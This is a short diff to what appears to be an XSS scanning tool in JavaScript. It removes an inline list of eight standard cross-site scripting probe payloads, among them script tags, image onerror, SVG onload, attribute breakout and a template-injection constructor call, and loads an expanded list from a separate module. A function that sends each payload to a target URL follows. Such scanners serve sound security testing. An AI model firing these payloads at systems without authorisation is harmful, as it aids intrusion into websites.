@@ -1,13 +1,5 @@
-const XSS_PAYLOADS = [
-  { payload: '<script>alert(1)</script>', type: 'reflected', description: 'Basic script tag XSS' },
-  { payload: '<img src=x onerror=alert(1)>', type: 'reflected', description: 'Image onerror XSS' },
-  { payload: '<svg onload=alert(1)>', type: 'reflected', description: 'SVG onload XSS' },
-  { payload: '"><script>alert(1)</script>', type: 'reflected', description: 'Breaking out of attribute' },
-  { payload: 'javascript:alert(1)', type: 'reflected', description: 'Javascript protocol XSS' },
-  { payload: '<input onfocus=alert(1) autofocus>', type: 'reflected', description: 'Input autofocus XSS' },
-  { payload: '{{constructor.constructor(\'alert(1)\')()}}', type: 'dom', description: 'SSTI XSS' },
-  { payload: '<!--><script>alert(1)</script>', type: 'reflected', description: 'HTML comment bypass' },
-];
+const { XSS_PAYLOADS_ENHANCED } = require('./payload-expansion');
+const XSS_PAYLOADS = XSS_PAYLOADS_ENHANCED;
 
 async function testXSSPayload(targetUrl, httpClient, test) {
   const encoded = encodeURIComponent(test.payload);
